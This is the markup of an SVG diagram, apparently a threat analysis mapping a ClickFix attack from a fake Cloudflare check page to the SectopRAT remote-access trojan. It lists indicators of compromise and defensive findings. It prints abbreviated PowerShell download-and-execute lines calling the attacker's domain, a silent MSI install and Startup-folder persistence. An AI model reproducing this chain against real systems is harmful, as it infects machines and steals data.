<line x1="380" y1="1002" x2="380" y2="1022" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>
<line x1="380" y1="1119" x2="380" y2="1139" stroke="#534AB7" stroke-width="1.5" stroke-dasharray="4 4" marker-end="url(#arrow)"/>
<line x1="380" y1="1236" x2="380" y2="1256" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>
<rect x="50" y="20" width="660" height="93" rx="10" fill="#E6F1FB" stroke="#185FA5" stroke-width="0.75"/>
<text x="72" y="42" dominant-baseline="central" font-size="14" font-weight="500" fill="#0C447C">Fake Cloudflare “verify you are human” page</text>
<text x="72" y="60" dominant-baseline="central" font-size="12" fill="#185FA5">https://lambardianviews.com/  — title “Just a moment…”</text>
<text x="76" y="79" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#0C447C"><tspan fill="#185FA5">├─ </tspan>fake Ray ID 949b32c259dd18b0; page copies a command to the clipboard</text>
<text x="76" y="95" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#0C447C"><tspan fill="#185FA5">├─ </tspan>ET MALWARE Observed ClickFix Powershell Delivery Page Inbound</text>
<rect x="50" y="137" width="660" height="77" rx="10" fill="#FAEEDA" stroke="#854F0B" stroke-width="0.75"/>
<text x="72" y="159" dominant-baseline="central" font-size="14" font-weight="500" fill="#633806">Victim: Win+R → Ctrl+V → Enter</text>
<text x="72" y="177" dominant-baseline="central" font-size="12" fill="#854F0B">runs the clipboard command from the Run box</text>
<text x="76" y="196" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#633806"><tspan fill="#854F0B">├─ </tspan>powershell -wi mi "$x=New-Object -COM Msxml2.XMLHTTP; $x.open('GET',…/s,0) …"</text>
<rect x="50" y="238" width="660" height="77" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="72" y="260" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">First stage, executed in memory</text>
<text x="72" y="278" dominant-baseline="central" font-size="12" fill="#993C1D">GET https://lambardianviews.com/s (1 KB) → [scriptblock]::Create(responseText)</text>
<text x="76" y="297" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#712B13"><tspan fill="#993C1D">├─ </tspan>relaunched hidden via cmd /s /c powershell -wi mi … (Base64 -EncodedCommand)</text>
<rect x="50" y="339" width="660" height="58" rx="10" fill="#FBEAF0" stroke="#993556" stroke-width="0.75"/>
<text x="72" y="361" dominant-baseline="central" font-size="14" font-weight="500" fill="#72243E">Infection beacon</text>
<text x="72" y="379" dominant-baseline="central" font-size="12" fill="#993556">GET https://lambardianviews.com/callback.php → 204 No Content</text>
<rect x="50" y="421" width="660" height="77" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="72" y="443" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">Payload download</text>
<text x="72" y="461" dominant-baseline="central" font-size="12" fill="#993C1D">GET https://lambardianviews.com/p1 (1 MB) → %TEMP%\patch.msi</text>
<text x="72" y="480" dominant-baseline="central" font-size="10" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#993C1D">SHA-256 89c28e7059e25d1e8cf5789d037f02e30da682ad7e7827482205353be39d2917  (patch.msi)</text>
<rect x="50" y="522" width="660" height="58" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="72" y="544" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">Dropper script</text>
<text x="72" y="562" dominant-baseline="central" font-size="12" fill="#993C1D">powershell -nop -ep bypass -f %TEMP%\edgeupd.ps1</text>
<rect x="50" y="604" width="660" height="93" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="72" y="626" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">Silent MSI install</text>
<text x="72" y="644" dominant-baseline="central" font-size="12" fill="#993C1D">cmd /c msiexec /i %TEMP%\patch.msi /qn /norestart</text>
<text x="76" y="663" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#712B13"><tspan fill="#993C1D">├─ </tspan>extracts to %LOCALAPPDATA%\Rookie_Hover\ with decoy VS / MinGW files</text>
<text x="76" y="679" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#712B13"><tspan fill="#993C1D">├─ </tspan>cab1.cab SHA-256 9f14eaca921a75e44daeab2dcf7b9c3c82b3f2a20e66424b5c6992c6960ef75f</text>
<rect x="50" y="721" width="660" height="77" rx="10" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.75"/>
<text x="72" y="743" dominant-baseline="central" font-size="14" font-weight="500" fill="#2C2C2A">cmd /c start Pave046.exe DepartManager.dat</text>
<text x="72" y="761" dominant-baseline="central" font-size="12" fill="#5F5E5A">Pave046.exe = legitimate AutoIt3 interpreter, renamed (1/68)</text>
<text x="72" y="780" dominant-baseline="central" font-size="10" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#5F5E5A">SHA-256 5d69a932a077fee044b193c28e84564143f5c7e51079ab48e88fef74ab0b77b7  (Pave046.exe)</text>
<rect x="50" y="822" width="660" height="77" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="72" y="844" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">Malicious AutoIt script</text>
<text x="72" y="862" dominant-baseline="central" font-size="12" fill="#993C1D">DepartManager.dat (28 KB) — not on VirusTotal</text>
<text x="72" y="881" dominant-baseline="central" font-size="10" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#993C1D">MD5 39593e5f17f12e398b39d768c374c277  (DepartManager.dat)</text>
<rect x="50" y="923" width="660" height="77" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="72" y="945" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">Packed payload</text>
<text x="72" y="963" dominant-baseline="central" font-size="12" fill="#993C1D">engine.data (452 KB), unpacked by the script — not on VirusTotal</text>
<text x="72" y="982" dominant-baseline="central" font-size="10" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#993C1D">MD5 470d24b15aad15579430abcf3569a9e7  (engine.data)</text>
<rect x="50" y="1024" width="660" height="93" rx="10" fill="#FCEBEB" stroke="#A32D2D" stroke-width="0.75"/>
<text x="72" y="1046" dominant-baseline="central" font-size="14" font-weight="500" fill="#791F1F">ArechClient2 / SectopRAT  (ANY.RUN attribution)</text>
<text x="72" y="1064" dominant-baseline="central" font-size="12" fill="#A32D2D">drives a hidden headless Chrome</text>
<text x="76" y="1083" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#791F1F"><tspan fill="#A32D2D">├─ </tspan>chrome.exe --headless --no-sandbox --disable-gpu --mute-audio</text>
<text x="76" y="1099" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#791F1F"><tspan fill="#A32D2D">├─ </tspan>--user-data-dir %TEMP%\vamaavdz.rgk</text>
<rect x="50" y="1141" width="660" height="93" rx="10" fill="#EEEDFE" stroke="#534AB7" stroke-width="0.75"/>
<text x="72" y="1163" dominant-baseline="central" font-size="14" font-weight="500" fill="#3C3489">Persistence</text>
<text x="72" y="1181" dominant-baseline="central" font-size="12" fill="#534AB7">%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\</text>
<text x="76" y="1200" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#3C3489"><tspan fill="#534AB7">├─ </tspan>DepartManager.vbs</text>
<text x="76" y="1216" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#3C3489"><tspan fill="#534AB7">├─ </tspan>DepartManager.bat  → relaunch Pave046.exe at logon</text>
<rect x="50" y="1258" width="660" height="58" rx="10" fill="#FCEBEB" stroke="#A32D2D" stroke-width="0.75"/>
<text x="72" y="1280" dominant-baseline="central" font-size="14" font-weight="500" fill="#791F1F">C2 (hard-coded IP, no DNS lookup)</text>
<text x="72" y="1298" dominant-baseline="central" font-size="12" fill="#A32D2D">185.121.233.13:443 — VDSINA (NL), VirusTotal 0/92</text>
